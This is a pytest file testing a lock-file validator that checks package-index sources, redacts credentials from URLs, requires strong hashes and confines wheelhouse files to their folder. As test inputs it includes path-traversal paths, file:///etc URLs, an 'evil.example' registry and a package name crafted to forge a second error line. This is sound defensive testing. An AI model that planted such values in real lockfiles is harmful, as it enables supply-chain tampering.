def test_a_url_that_can_be_registered_is_shown_whole_quoted_and_canonical() -> None:
    """I2: the command carries the canonical form, never a cut one."""
    for length in (81, 500):
        url = "https://Long.Example:443/" + "a" * length + "/"
        canonical = "https://long.example/" + "a" * length
        (message,) = _messages(_PYPROJECT, _locked(f'{{ registry = "{url}" }}'), sources=_SOURCES)
        assert f"from the package index {canonical}, which is not registered" in message
        assert f"(`lakana index add NAME --url {canonical}`)" in message
    host_and_port = "https://user:123/w@host.example/simple"
    (message,) = _messages(
        _PYPROJECT, _locked(f'{{ registry = "{host_and_port}" }}'), sources=_SOURCES
    )
    assert f"--url {host_and_port}`" in message
    odd = "https://[::1]:8443/feed@view/s"
    (message,) = _messages(_PYPROJECT, _locked(f'{{ registry = "{odd}" }}'), sources=_SOURCES)
    assert f"--url {shlex.quote(odd)}`" in message
    assert "***" not in message


@pytest.mark.parametrize(
    "url",
    [
        "https://reader@pkgs.example.org/simple",
        "https://reader:s3cret@pkgs.example.org/simple/",
        "https://reader:pa#ss@pkgs.example.org/simple",
        "https://reader:pa?ss@pkgs.example.org/simple",
    ],
)
def test_a_user_name_in_a_declared_url_does_not_switch_the_rules_off(url: str) -> None:
    """I3, three places: the lock writes the URL without its userinfo, so the rules still apply."""
    declared = f'\n[[tool.uv.index]]\nname = "mine"\nurl = "{url}"\ndefault = true\n'
    messages = _messages(_PYPROJECT + declared, _GOOD, sources=_SOURCES)
    if "#" in url or "?" in url:
        # uv ends the authority at the first `#` or `?`: the host is not the registered one.
        assert messages == []
        return
    (message,) = messages
    assert message.startswith("pyproject.toml: the index mine (https://***@pkgs.example.org/simple")
    assert "s3cret" not in message and "reader" not in message
    other_name = declared.replace('name = "mine"', 'name = "team"')
    named = _messages(_PYPROJECT + other_name + "explicit = true\n", _GOOD, sources=_SOURCES)
    assert named == []
    for key, value in (("index-url", f'"{url}"'), ("extra-index-url", f'["{url}"]')):
        setting = f"\n[tool.uv]\n{key} = {value}\n"
        (plain,) = _messages(_PYPROJECT + setting, _GOOD, sources=_SOURCES)
        assert plain.startswith(f"pyproject.toml: `{key}` names the registered package index team")


@pytest.mark.parametrize(
    "registry",
    [
        "https:/u:hunter2@h/s",
        "https:\\u:hunter2@h/s",
        "//u:hunter2@h/s",
        "u:hunter2@h/s",
        "x?token=hunter2",
    ],
)
def test_a_malformed_registry_value_is_not_shown_raw(registry: str) -> None:
    lock = _locked("{ registry = '" + registry + "' }")
    (message,) = _messages(_PYPROJECT, lock, sources=_SOURCES)
    assert "hunter2" not in message and "token" not in message
    assert message.startswith("uv.lock: takes p0 from the local folder ")


@pytest.mark.parametrize(
    "path",
    [
        "../outside/zzpkg-1.0.0-py3-none-any.whl",
        "a/../../outside/zzpkg-1.0.0-py3-none-any.whl",
        "a/..",
        "/etc/zzpkg-1.0.0-py3-none-any.whl",
        "..\\outside\\zzpkg-1.0.0-py3-none-any.whl",
        "",
        7,
    ],
)
def test_a_wheelhouse_file_outside_the_folder_is_refused(path: object) -> None:
    shown = f"'{path}'" if isinstance(path, str) else path
    for entry in (f"wheels = [{{ path = {shown} }}]", f"sdist = {{ path = {shown} }}"):
        lock = _GOOD + (
            b'\n[[package]]\nname = "zzpkg"\nversion = "1"\n'
            b'source = { registry = "wheelhouse" }\n' + entry.encode() + b"\n"
        )
        assert _messages(_PYPROJECT, lock, sources=_SOURCES) == [
            "uv.lock: takes zzpkg from a file outside the folder `wheelhouse`; packages in "
            "`wheelhouse` must be files inside that folder. Put the file into `wheelhouse` "
            "(not a path with `..`, a backslash or a leading slash), then run `uv lock`"
        ]


def test_files_inside_the_wheelhouse_folder_pass() -> None:
    lock = _GOOD + (
        b'\n[[package]]\nname = "zzpkg"\nversion = "1"\nsource = { registry = "wheelhouse" }\n'
        b'wheels = [{ path = "zzpkg-1-py3-none-any.whl" }, { path = "sub/zzpkg.whl" }]\n'
        b'sdist = { path = "zzpkg-1.tar.gz" }\n'
    )
    assert _messages(_PYPROJECT, lock, sources=_SOURCES) == []


def test_a_package_name_cannot_forge_a_second_issue() -> None:
    """m5: issues are joined with `; ` for display, so a name must not hold one."""
    name = "x from PyPI; pyproject.toml: is fine; uv.lock: takes y"
    lock = (
        _GOOD
        + (
            f'\n[[package]]\nname = "{name}"\nversion = "1"\n'
            'source = { registry = "https://evil.example/simple" }\n'
        ).encode()
    )
    local = (
        _GOOD
        + f'\n[[package]]\nname = "{name}"\nversion = "1"\nsource = {{ path = "x" }}\n'.encode()
    )
    for text in (lock, local):
        (message,) = _messages(_PYPROJECT, text, sources=_SOURCES)
        assert "x from PyPI\\x3b pyproject.toml: is fine\\x3b uv.lock: takes y" in message
        assert "; pyproject.toml" not in message


def test_used_indexes_are_sorted_by_name_whatever_the_order_of_the_lock() -> None:
    registered = KnownSources(
        (
            RegisteredIndex("b", "https://b.example/simple"),
            RegisteredIndex("a", "https://a.example/simple"),
            RegisteredIndex("c", "https://c.example/simple"),
        )
    )
    lock = _locked(
        '{ registry = "https://c.example/simple" }',
        '{ registry = "https://a.example/simple/" }',
        '{ registry = "https://b.example/simple" }',
    )
    assert [index.name for index in used_indexes(lock, registered)] == ["a", "b", "c"]


def test_a_declared_url_with_a_query_is_the_registered_index_and_shows_no_token() -> None:
    declared = '\n[[tool.uv.index]]\nname = "mine"\nurl = "https://pkgs.example.org/simple?token=hunter2"\n'
    (message,) = _messages(_PYPROJECT + declared, _GOOD, sources=_SOURCES)
    assert "needs `explicit = true`" in message
    assert "hunter2" not in message and "token" not in message


def test_a_named_python_is_checked_at_its_first_release() -> None:
    """Without `python:` the worker's own interpreter counts; a named other one counts as x.y.0."""
    assert task_interpreter(None) == tuple(sys.version_info[:3])
    own = f"{sys.version_info.major}.{sys.version_info.minor}"
    assert task_interpreter(own) == tuple(sys.version_info[:3])
    assert task_interpreter("3.99") == (3, 99, 0)


def test_requires_python_names_lakana_yaml_when_the_project_names_its_python() -> None:
    """`python:` decides the interpreter, so the issue points there, not at the worker."""
    lock = _lock(("lakana", "0.8.3"), ("polars", "1.44.2"), requires_python=">=3.13")
    assert _messages(_PYPROJECT, lock, python=(3, 12, 0), named_python="3.12") == [
        "uv.lock: requires-python '>=3.13' does not admit Python 3.12, which python: in "
        "lakana.yaml names"
    ]
    assert _messages(_PYPROJECT, lock, python=(3, 12, 4)) == [
        "uv.lock: requires-python '>=3.13' does not admit the worker's Python 3.12.4"
    ]
    assert _messages(_PYPROJECT, lock, python=(3, 13, 0), named_python="3.13") == []


_HASH = "sha256:" + "a" * 64


def _with_files(registry: str, *entries: str) -> bytes:
    """Build a fine lock plus a package `zzpkg` with the given file entries.

    Parameters
    ----------
    registry
        The package's ``registry``.
    *entries
        TOML lines of the package table, such as ``wheels = [...]`` or ``sdist = {...}``.

    Returns
    -------
    bytes
        The lock file.
    """
    body = "".join(entry + "\n" for entry in entries)
    return (
        _GOOD
        + (
            '\n[[package]]\nname = "zzpkg"\nversion = "1"\n'
            f'source = {{ registry = "{registry}" }}\n' + body
        ).encode()
    )


def test_files_of_an_index_with_a_hash_on_its_own_or_another_host_pass() -> None:
    """The rule names indexes, not download hosts (#77 leaves hosts open)."""
    lock = _with_files(
        "https://pypi.org/simple",
        f'sdist = {{ url = "https://files.pythonhosted.org/z.tar.gz", hash = "{_HASH}" }}',
        f'wheels = [{{ url = "https://files.pythonhosted.org/z.whl", hash = "{_HASH}" }}]',
    )
    assert _messages(_PYPROJECT, lock, sources=_SOURCES) == []
    assert source_issues(_PYPROJECT, lock, _SOURCES) == []


@pytest.mark.parametrize(
    "entry",
    [
        'wheels = [{ url = "https://files.pythonhosted.org/z.whl" }]',
        'sdist = { url = "https://files.pythonhosted.org/z.tar.gz" }',
        'wheels = [{ url = "https://files.pythonhosted.org/z.whl", hash = "" }]',
        'wheels = [{ url = "https://files.pythonhosted.org/z.whl", hash = 7 }]',
        'wheels = [{ url = "https://files.pythonhosted.org/z.whl", hash = "md5:'
        + "a" * 32
        + '" }]',
        'wheels = [{ url = "https://files.pythonhosted.org/z.whl", hash = "sha256:abc" }]',
    ],
)
def test_a_file_of_an_index_without_a_strong_hash_is_refused(entry: str) -> None:
    """A lock written by `uv lock` always has one; a hand-edited lock need not (#77)."""
    lock = _with_files("https://pypi.org/simple", entry)
    expected = [
        "uv.lock: has no SHA-256 (or SHA-384, SHA-512) hash for a file of zzpkg; `uv lock` "
        "writes one for every file of a package index, and the worker builds only what the "
        "lock pins. Run `uv lock`, commit the lock as it writes it, then deploy again"
    ]
    assert _messages(_PYPROJECT, lock, sources=_SOURCES) == expected
    assert [issue.render() for issue in source_issues(_PYPROJECT, lock, _SOURCES)] == expected


@pytest.mark.parametrize(
    "url",
    [
        "file:///etc/zzpkg-1-py3-none-any.whl",
        "FILE:/home/worker/.cache/uv/zzpkg.whl",
        "ftp://files.example/zzpkg.whl",
        "zzpkg-1-py3-none-any.whl",
        "//files.example/zzpkg.whl",
    ],
)
def test_a_file_of_an_index_that_is_not_an_http_url_is_refused(url: str) -> None:
    """A `file:` URL would let a lock install any file the worker can read (#77)."""
    lock = _with_files(
        "https://pypi.org/simple", f'wheels = [{{ url = "{url}", hash = "{_HASH}" }}]'
    )
    expected = [
        "uv.lock: takes zzpkg from a file that is not an http or https URL; a lock may name "
        "only the files of a package index, or files inside the folder `wheelhouse` by their "
        "path. Run `uv lock`, commit the lock as it writes it, then deploy again"
    ]
    assert _messages(_PYPROJECT, lock, sources=_SOURCES) == expected
    assert [issue.render() for issue in source_issues(_PYPROJECT, lock, _SOURCES)] == expected


def test_a_wheelhouse_package_that_names_a_url_is_outside_the_folder() -> None:
    """`uv lock` names a wheelhouse file by its path; a URL there leaves the folder (#77)."""
    for url in ("file:///etc/zzpkg.whl", "https://files.example/zzpkg.whl"):
        lock = _with_files("wheelhouse", f'wheels = [{{ url = "{url}", hash = "{_HASH}" }}]')
        (message,) = _messages(_PYPROJECT, lock, sources=_SOURCES)
        assert message.startswith(
            "uv.lock: takes zzpkg from a file outside the folder `wheelhouse`"
        )


def test_files_inside_the_wheelhouse_need_no_hash() -> None:
    """`uv lock` writes none for a local folder; the deployed commit fixes their bytes."""
    lock = _with_files(
        "wheelhouse",
        'sdist = { path = "zzpkg-1.tar.gz" }',
        'wheels = [{ path = "zzpkg-1-py3-none-any.whl" }]',
    )
    assert _messages(_PYPROJECT, lock, sources=_SOURCES) == []
